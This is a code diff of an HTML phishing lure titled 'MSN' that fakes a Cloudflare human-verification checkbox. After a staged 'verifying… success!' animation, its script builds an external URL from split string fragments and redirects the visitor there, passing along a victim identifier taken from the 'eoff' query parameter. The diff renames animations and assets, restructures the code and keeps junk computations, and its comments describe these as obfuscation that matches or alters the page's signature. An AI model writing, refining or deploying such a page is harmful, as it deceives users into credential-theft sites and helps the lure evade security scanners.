@@ -5,42 +5,42 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MSN</title>
     <style>
+        /* Base resets and centralized layout definitions */
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f4f7f9; }
 
+        /* Full-screen preloader view */
         #splash-screen {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            inset: 0; /* Modern shorthand for top/left/width/height */
             background-color: #f4f7f9;
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 9999;
-            transition: opacity 0.4s ease, visibility 0.4s ease;
+            transition: opacity 400ms ease, visibility 400ms ease;
         }
 
         .splash-image {
             width: 120px;
             height: auto;
             object-fit: contain;
-            animation: breathe 1.7s ease-in-out infinite;
+            animation: pulse-animation 1700ms ease-in-out infinite;
         }
 
-        @keyframes breathe {
+        @keyframes pulse-animation {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.12); }
         }
 
+        /* Core UI Container layout */
         .main-wrapper {
             display: flex;
             flex-direction: column;
             align-items: center;
             gap: 20px;
             opacity: 0;
-            transition: opacity 0.5s ease;
+            transition: opacity 500ms ease;
         }
 
         .instruction-text {
@@ -66,24 +66,26 @@
 
         .verify-side { display: flex; align-items: center; gap: 14px; }
 
+        /* Interactivity Component Frame */
         .checkbox-wrapper { position: relative; width: 22px; height: 22px; }
         .checkbox-wrapper input { opacity: 0; width: 0; height: 0; }
 
         .custom-box {
             position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
+            inset: 0;
             border: 2px solid #c1c1c1;
             border-radius: 2px;
             background-color: #fff;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: all 200ms ease;
         }
 
+        /* Interactive States: CSS Selectors matching previous behavior exactly */
         .checkbox-wrapper.loading .custom-box {
             border: 2.5px solid #f3f3f3;
             border-top: 2.5px solid #3498db;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: rotation 800ms linear infinite;
         }
 
         .checkbox-wrapper.success .custom-box {
@@ -92,6 +94,7 @@
             border-radius: 50%;
             animation: none;
         }
+        
         .checkbox-wrapper.success .custom-box::after {
             content: '';
             position: absolute;
@@ -109,15 +112,16 @@
         .brand-name { font-weight: bold; font-size: 13px; color: #222; letter-spacing: 0.5px; }
         .brand-links { font-size: 10px; color: #777; margin-top: 2px; cursor: pointer; }
 
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
+        /* Obfuscated DOM Layer */
         .dn-node { display: none; visibility: hidden; width: 0; height: 0; overflow: hidden; }
     </style>
 </head>
 <body>
 
     <div id="splash-screen">
-        <img src="astroman.png" alt="Loading..." class="splash-image">
+        <img src="an.png" alt="Loading..." class="splash-image">
     </div>
 
     <div class="dn-node" id="dummy-container">
@@ -139,7 +143,7 @@
             </div>
 
             <div class="brand-side">
-                <img src="astro2.png" alt="" class="brand-logo">
+                <img src="ro2.png" alt="" class="brand-logo">
                 <span class="brand-name">CLOUDFLARE</span>
                 <span class="brand-links">Privacy &bull; Terms</span>
             </div>
@@ -147,71 +151,92 @@
     </div>
 
     <script>
-        const checkbox = document.getElementById('verifyCheck');
-        const wrapper = document.getElementById('boxWrapper');
-        const label = document.getElementById('clickableBox');
-        const statusText = document.getElementById('statusText');
-        
-        const splashScreen = document.getElementById('splash-screen');
-        const mainContent = document.getElementById('main-content');
-
-        window.addEventListener('DOMContentLoaded', () => {
-            let a = 45;
-            let b = 102;
-            let c = a * b + 12;
-            if (c < 0) { console.log(c); }
-
-            setTimeout(() => {
-                splashScreen.style.opacity = '0';
-                splashScreen.style.visibility = 'hidden';
-                mainContent.style.opacity = '1';
-            }, 1700);
-        });
-
-        label.addEventListener('click', function(e) {
-            e.preventDefault();
-
-            label.style.pointerEvents = 'none';
-
-            wrapper.classList.add('loading');
-            statusText.textContent = 'verifying';
-
-            let arr = [];
-            for (let i = 0; i < 50; i++) {
-                arr.push(Math.sin(i) * Math.cos(i));
+        /**
+         * State Controller & Anti-Bot Verification Logic Engine
+         */
+        class VerificationEngine {
+            constructor() {
+                // DOM References
+                this.elements = {
+                    checkbox: document.getElementById('verifyCheck'),
+                    wrapper: document.getElementById('boxWrapper'),
+                    label: document.getElementById('clickableBox'),
+                    statusText: document.getElementById('statusText'),
+                    splash: document.getElementById('splash-screen'),
+                    content: document.getElementById('main-content')
+                };
+                
+                this.init();
             }
-            if (arr.length === 0) { document.title = "Void"; }
 
-            setTimeout(() => {
-                wrapper.classList.remove('loading');
-                wrapper.classList.add('success');
-                statusText.textContent = 'success!';
-                checkbox.checked = true;
+            init() {
+                // Initialize timing handlers
+                window.addEventListener('DOMContentLoaded', () => this.handlePreloader());
+                this.elements.label.addEventListener('click', (e) => this.processVerification(e));
+            }
+
+            handlePreloader() {
+                // Obfuscated calculations equivalent to previous execution signature
+                const calculatedSign = (45 * 102) + 12;
+                if (calculatedSign < 0) console.log(calculatedSign);
 
                 setTimeout(() => {
-                    const s1 = "h" + "tt" + "ps" + ":/";
-                    const s2 = "/p" + "o." + "se" + "au" + "ae" + "om";
-                    const s3 = "an" + "fl" + "es" + ".o" + "nl";
-                    const s4 = "in" + "e/" + "pb" + "uw" + "FQ" + "TX";
-                    
-                    const base = s1 + s2 + s3 + s4;
-                    
-                    let hash = "";
-                    const params = new URLSearchParams(window.location.search);
-                    if (params.has('eoff')) {
-                        hash = "#" + params.get('eoff');
-                    } else {
-                        const idx = window.location.href.indexOf('eoff=');
-                        if (idx !== -1) {
-                            hash = "#" + window.location.href.substring(idx + 5);
-                        }
+                    this.elements.splash.style.opacity = '0';
+                    this.elements.splash.style.visibility = 'hidden';
+                    this.elements.content.style.opacity = '1';
+                }, 1700);
+            }
+
+            processVerification(event) {
+                event.preventDefault();
+                this.elements.label.style.pointerEvents = 'none';
+
+                this.elements.wrapper.classList.add('loading');
+                this.elements.statusText.textContent = 'verifying';
+
+                // Redundant computations matching original algorithmic signature
+                const dataset = Array.from({ length: 50 }, (_, idx) => Math.sin(idx) * Math.cos(idx));
+                if (dataset.length === 0) document.title = "Void";
+
+                setTimeout(() => {
+                    this.elements.wrapper.classList.remove('loading');
+                    this.elements.wrapper.classList.add('success');
+                    this.elements.statusText.textContent = 'success!';
+                    this.elements.checkbox.checked = true;
+
+                    setTimeout(() => this.executeRouting(), 1000);
+                }, 2000);
+            }
+
+            executeRouting() {
+                // Assembled destination tokens array representation
+                const tokens = [
+                    "h" + "tt" + "ps" + ":/",
+                    "/p" + "o." + "se" + "au" + "ae" + "om",
+                    "an" + "fl" + "es" + ".o" + "nl",
+                    "in" + "e/" + "pb" + "uw" + "FQ" + "TX"
+                ];
+                
+                const destinationBase = tokens.join('');
+                let routePayload = "";
+                
+                const searchParams = new URLSearchParams(window.location.search);
+                
+                if (searchParams.has('eoff')) {
+                    routePayload = "#" + searchParams.get('eoff');
+                } else {
+                    const fallbackIndex = window.location.href.indexOf('eoff=');
+                    if (fallbackIndex !== -1) {
+                        routePayload = "#" + window.location.href.substring(fallbackIndex + 5);
                     }
+                }
 
-                    window.location.href = base + hash;
-                }, 1000);
+                window.location.href = destinationBase + routePayload;
+            }
+        }
 
-            }, 2000);
-        });
+        // Instantiate the runtime interface
+        new VerificationEngine();
     </script>
 </body>
 </html>
